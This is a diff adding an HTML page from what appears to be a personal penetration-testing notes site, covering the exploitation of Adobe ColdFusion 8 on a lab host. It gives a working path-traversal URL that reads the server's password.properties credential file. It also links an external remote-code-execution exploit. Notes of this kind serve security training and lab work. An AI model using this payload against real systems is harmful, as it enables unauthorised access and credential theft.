@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Maven+Pro:wght@400..900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/H4ckV4ult/styles/navBarStyles.css">
+    <link rel="stylesheet" href="/H4ckV4ult/styles/walkthroughs.css">
+        <link href="/H4ckV4ult/styles/prism/prism.css" rel="stylesheet" />
+    <script src="/H4ckV4ult/styles/prism/prism.js"></script>
+    <title>Minimalist Webpage</title>
+
+</head>
+<body>
+    <div id="navbar-container"></div>
+    <script src="/H4ckV4ult/components/navbar.js"></script>
+
+    <div class="notion-container">
+        <div class="notion-header">
+            <h1>Adobe ColdFusion 8 (TCP/8500)</h1>
+            <p>A commercial rapid web-application development platform that used the ColdFusion Markup Language. Also called (CFIDE)</p>
+            
+        </div>
+        <div class="notion-body">
+            <h2>Exploitation</h2>
+            <ul>
+                <h3>Local file inclusion</h3>
+                    <ul>
+                        <p>Local file inclusion is achieved by requesting the following url</p>
+                        <pre><code class="language-sql">10.10.10.11:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../../ColdFusion8/lib/&password.properties%00en</code></pre>
+            <p>The password will be displayed and it can be cracked using any tool</p>
+                    </ul>
+                <h3>RCE</h3>
+                    <ul>
+                        <p>An RCE can be achieved by using the following script <a class="notion-link" href="https://www.exploit-db.com/exploits/50057"> here </a></p>
+                    </ul>
+            </ul>    
+        </div>
+    </div>
+</body>
+</html>
